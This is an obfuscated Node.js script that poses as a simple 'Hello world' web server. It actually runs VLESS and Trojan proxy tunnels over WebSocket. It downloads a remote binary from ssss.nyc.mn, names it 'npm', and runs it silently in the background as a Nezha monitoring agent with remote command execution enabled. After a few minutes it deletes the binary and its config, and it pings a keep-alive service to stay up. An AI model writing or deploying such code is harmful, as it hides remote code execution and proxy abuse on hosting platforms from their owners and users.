const w=b;(function(c,d){const v=b,e=c();while(!![]){try{const f=-parseInt(v(0x15e))/0x1+-parseInt(v(0x16f))/0x2+-parseInt(v(0xfd))/0x3*(parseInt(v(0x14d))/0x4)+-parseInt(v(0x10c))/0x5*(parseInt(v(0x12d))/0x6)+-parseInt(v(0x159))/0x7*(parseInt(v(0x154))/0x8)+-parseInt(v(0x136))/0x9*(-parseInt(v(0x13b))/0xa)+parseInt(v(0x16b))/0xb*(parseInt(v(0x137))/0xc);if(f===d)break;else e['push'](e['shift']());}catch(g){e['push'](e['shift']());}}}(a,0x4c19b));function b(c,d){c=c-0xef;const e=a();let f=e[c];return f;}const os=require('os'),http=require(w(0x11b)),fs=require('fs'),axios=require('axios'),net=require(w(0x16c)),path=require(w(0x142)),crypto=require(w(0x15c)),{Buffer}=require(w(0x11c)),{exec,execSync}=require(w(0x164)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process['env']['UUID']||w(0x10e),NEZHA_SERVER=process[w(0x104)][w(0x14f)]||'',NEZHA_PORT=process[w(0x104)][w(0x124)]||'',NEZHA_KEY=process['env']['NEZHA_KEY']||'',DOMAIN=process['env']['DOMAIN']||w(0x145),AUTO_ACCESS=process[w(0x104)][w(0x101)]||!![],WSPATH=process['env'][w(0x116)]||UUID[w(0x156)](0x0,0x8),SUB_PATH=process[w(0x104)][w(0x161)]||w(0x135),NAME=process['env'][w(0x149)]||'Hug',PORT=process[w(0x104)]['PORT']||0x1eb4;function a(){const Y=['base64','every','join','application/dns-json','325842YPheBP','net','arm64','connect','997800Ywjlsp','reduce','Not\x20Found\x0a','digest','close','writeFileSync','createHash','Answer','https://amd64.ssss.nyc.mn/agent','message','writeHead','listen',':443?security=tls&sni=','npm\x20is\x20already\x20running,\x20skip\x20running...','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','pipe','setsid\x20nohup\x20./npm\x20-s\x20','45249OnCLce','Failed\x20to\x20resolve\x20','\x20with\x20all\x20DNS\x20servers','update','AUTO_ACCESS','end','Hello\x20world!','env','log','text/plain','decode','finish','https://','2096','arch','40FLBKgV','aarch64','f3681ac0-6dd9-4e21-8104-02e84e5b45f0','concat','error:\x20','readUInt8','Server\x20is\x20running\x20on\x20port\x20','get','createWriteStream','vless://','WSPATH','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','https://speed.cloudflare.com/meta','/bin/bash','true','http','buffer','find','data','https://arm64.ssss.nyc.mn/v1','npm\x20download\x20successfully','Server','config.yaml','write','NEZHA_PORT','split','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','arm','&path=%2F','npm','--tls','includes','stream','425526TzBmIB','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','then','trim','test','https://dns.google/resolve?name=','utf-8','application/json','Qty0617','2925JtcTCQ','660PXABXZ','url','map','443','17770uDyTtQ','npm\x20running\x20error:','connection','pop','createServer','2087',':443?encryption=none&security=tls&sni=','path','https://oooo.serv00.net/add-url','https://amd64.ssss.nyc.mn/v1','1234.abc.com','readFile','error','\x20-p\x20','NAME','sha224','8.8.4.4','utf8','4dsHqXW','1.1.1.1','NEZHA_SERVER','readUInt16BE','hex','npm\x20is\x20running','false','4099128qsoxRg','Unknown','slice','8443','&fp=chrome&type=ws&host=','7nqqBHg','2083','toString','crypto','length','301286CBYGWq','https://arm64.ssss.nyc.mn/agent','text/html','SUB_PATH','catch','client_secret:\x20','child_process','replace','country'];a=function(){return Y;};return a();}let ISP='';const GetISP=async()=>{const x=w;try{const c=await axios['get'](x(0x118)),d=c['data'];ISP=(d[x(0x166)]+'-'+d['asOrganization'])[x(0x165)](/ /g,'_');}catch(f){ISP=x(0x155);}};GetISP();const httpServer=http[w(0x13f)]((c,d)=>{const y=w;if(c[y(0x138)]==='/'){const e=path[y(0x169)](__dirname,'index.html');fs[y(0x146)](e,y(0x14c),(f,g)=>{const z=y;if(f){d['writeHead'](0xc8,{'Content-Type':z(0x160)}),d[z(0x102)](z(0x103));return;}d['writeHead'](0xc8,{'Content-Type':z(0x160)}),d[z(0x102)](g);});return;}else{if(c[y(0x138)]==='/'+SUB_PATH){const f=y(0x115)+UUID+'@'+DOMAIN+y(0x141)+DOMAIN+y(0x158)+DOMAIN+y(0x128)+WSPATH+'#'+NAME+'-'+ISP,g='trojan://'+UUID+'@'+DOMAIN+y(0xf8)+DOMAIN+'&fp=chrome&type=ws&host='+DOMAIN+'&path=%2F'+WSPATH+'#'+NAME+'-'+ISP,h=f+'\x0a'+g,i=Buffer['from'](h)[y(0x15b)](y(0x167));d[y(0xf6)](0xc8,{'Content-Type':y(0x106)}),d[y(0x102)](i+'\x0a');}else d[y(0xf6)](0x194,{'Content-Type':y(0x106)}),d[y(0x102)](y(0x171));}}),wss=new WebSocket[(w(0x121))]({'server':httpServer}),uuid=UUID['replace'](/-/g,''),DNS_SERVERS=[w(0x14b),w(0x14e)];function resolveHost(c){return new Promise((d,e)=>{const A=b;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[A(0x131)](c)){d(c);return;}let f=0x0;function g(){const B=A;if(f>=DNS_SERVERS['length']){e(new Error(B(0xfe)+c+B(0xff)));return;}const h=DNS_SERVERS[f];f++;const i=B(0x132)+encodeURIComponent(c)+'&type=A';axios[B(0x113)](i,{'timeout':0x1388,'headers':{'Accept':B(0x16a)}})[B(0x12f)](j=>{const C=B,k=j[C(0x11e)];if(k['Status']===0x0&&k[C(0xf3)]&&k['Answer'][C(0x15d)]>0x0){const l=k[C(0xf3)][C(0x11d)](m=>m['type']===0x1);if(l){d(l[C(0x11e)]);return;}}g();})[B(0x162)](j=>{g();});}g();});}function handleVlessConnection(c,d){const D=w,[e]=d,f=d[D(0x156)](0x1,0x11);if(!f[D(0x168)]((m,n)=>m==parseInt(uuid['substr'](n*0x2,0x2),0x10)))return![];let g=d[D(0x156)](0x11,0x12)[D(0x111)]()+0x13;const h=d['slice'](g,g+=0x2)[D(0x150)](0x0),j=d[D(0x156)](g,g+=0x1)[D(0x111)](),k=j==0x1?d[D(0x156)](g,g+=0x4)[D(0x169)]('.'):j==0x2?new TextDecoder()[D(0x107)](d['slice'](g+0x1,g+=0x1+d[D(0x156)](g,g+0x1)[D(0x111)]())):j==0x3?d[D(0x156)](g,g+=0x10)[D(0x170)]((m,n,o,p)=>o%0x2?m[D(0x10f)](p[D(0x156)](o-0x1,o+0x1)):m,[])[D(0x139)](m=>m[D(0x150)](0x0)[D(0x15b)](0x10))[D(0x169)](':'):'';c['send'](new Uint8Array([e,0x0]));const l=createWebSocketStream(c);return resolveHost(k)[D(0x12f)](m=>{const F=D;net['connect']({'host':m,'port':h},function(){const E=b;this['write'](d[E(0x156)](g)),l['on'](E(0x147),()=>{})[E(0xfb)](this)['on'](E(0x147),()=>{})[E(0xfb)](l);})['on'](F(0x147),()=>{});})['catch'](m=>{const G=D;net[G(0x16e)]({'host':k,'port':h},function(){const H=G;this[H(0x123)](d[H(0x156)](g)),l['on'](H(0x147),()=>{})[H(0xfb)](this)['on'](H(0x147),()=>{})[H(0xfb)](l);})['on'](G(0x147),()=>{});}),!![];}function handleTrojanConnection(c,d){const I=w;try{if(d['length']<0x3a)return![];const e=d[I(0x156)](0x0,0x38)[I(0x15b)](),f=[UUID];let g=null;for(const n of f){const o=crypto[I(0xf2)](I(0x14a))[I(0x100)](n)[I(0xef)](I(0x151));if(o===e){g=n;break;}}if(!g)return![];let h=0x38;d[h]===0xd&&d[h+0x1]===0xa&&(h+=0x2);const i=d[h];if(i!==0x1)return![];h+=0x1;const j=d[h];h+=0x1;let k,l;if(j===0x1)k=d[I(0x156)](h,h+0x4)[I(0x169)]('.'),h+=0x4;else{if(j===0x3){const p=d[h];h+=0x1,k=d[I(0x156)](h,h+p)[I(0x15b)](),h+=p;}else{if(j===0x4)k=d[I(0x156)](h,h+0x10)['reduce']((q,r,t,u)=>t%0x2?q['concat'](u[I(0x156)](t-0x1,t+0x1)):q,[])[I(0x139)](q=>q[I(0x150)](0x0)[I(0x15b)](0x10))[I(0x169)](':'),h+=0x10;else return![];}}l=d[I(0x150)](h),h+=0x2;h<d[I(0x15d)]&&d[h]===0xd&&d[h+0x1]===0xa&&(h+=0x2);const m=createWebSocketStream(c);return resolveHost(k)[I(0x12f)](q=>{const J=I;net[J(0x16e)]({'host':q,'port':l},function(){const K=J;h<d[K(0x15d)]&&this[K(0x123)](d['slice'](h)),m['on'](K(0x147),()=>{})['pipe'](this)['on'](K(0x147),()=>{})[K(0xfb)](m);})['on'](J(0x147),()=>{});})[I(0x162)](q=>{const L=I;net[L(0x16e)]({'host':k,'port':l},function(){const M=L;h<d[M(0x15d)]&&this[M(0x123)](d[M(0x156)](h)),m['on'](M(0x147),()=>{})['pipe'](this)['on'](M(0x147),()=>{})[M(0xfb)](m);})['on'](L(0x147),()=>{});}),!![];}catch(q){return![];}}wss['on'](w(0x13d),(c,d)=>{const N=w,e=d[N(0x138)]||'';c['once'](N(0xf5),f=>{const O=N;if(f['length']>0x11&&f[0x0]===0x0){const g=f[O(0x156)](0x1,0x11),h=g[O(0x168)]((j,k)=>j==parseInt(uuid['substr'](k*0x2,0x2),0x10));if(h){!handleVlessConnection(c,f)&&c[O(0xf0)]();return;}}!handleTrojanConnection(c,f)&&c[O(0xf0)]();})['on']('error',()=>{});});const getDownloadUrl=()=>{const P=w,c=os[P(0x10b)]();return c===P(0x127)||c===P(0x16d)||c===P(0x10d)?!NEZHA_PORT?P(0x11f):P(0x15f):!NEZHA_PORT?P(0x144):P(0xf4);},downloadFile=async()=>{const Q=w;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const c=getDownloadUrl(),d=await axios({'method':Q(0x113),'url':c,'responseType':Q(0x12c)}),e=fs[Q(0x114)](Q(0x129));return d[Q(0x11e)]['pipe'](e),new Promise((f,g)=>{const R=Q;e['on'](R(0x108),()=>{const S=R;console[S(0x105)](S(0x120)),exec('chmod\x20+x\x20npm',h=>{if(h)g(h);f();});}),e['on'](R(0x147),g);});}catch(f){throw f;}},runnz=async()=>{const T=w;try{const f=execSync('ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22',{'encoding':T(0x133)});if(f[T(0x130)]()!==''){console[T(0x105)](T(0xf9));return;}}catch(g){}await downloadFile();let c='',d=[T(0x13a),T(0x157),T(0x10a),T(0x140),T(0x15a),'2053'];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const h=d[T(0x12b)](NEZHA_PORT)?T(0x12a):'';c=T(0xfc)+NEZHA_SERVER+':'+NEZHA_PORT+T(0x148)+NEZHA_KEY+'\x20'+h+'\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&';}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const i=NEZHA_SERVER[T(0x12b)](':')?NEZHA_SERVER[T(0x125)](':')[T(0x13e)]():'',j=d[T(0x12b)](i)?T(0x11a):T(0x153),k=T(0x163)+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+NEZHA_SERVER+T(0x12e)+j+T(0x117)+UUID;fs[T(0xf1)](T(0x122),k);}c=T(0xfa);}else{console[T(0x105)](T(0x126));return;}}try{exec(c,{'shell':T(0x119)},l=>{const U=T;if(l)console[U(0x147)](U(0x13c),l);else console[U(0x105)](U(0x152));});}catch(l){console['error'](T(0x110)+l);}};async function addAccessTask(){const V=w;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const c=V(0x109)+DOMAIN;try{const d=await axios['post'](V(0x143),{'url':c},{'headers':{'Content-Type':V(0x134)}});console[V(0x105)]('Automatic\x20Access\x20Task\x20added\x20successfully');}catch(e){}}const delFiles=()=>{const W=w;fs['unlink']('npm',()=>{}),fs['unlink'](W(0x122),()=>{});};httpServer[w(0xf7)](PORT,()=>{const X=w;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[X(0x105)](X(0x112)+PORT);});
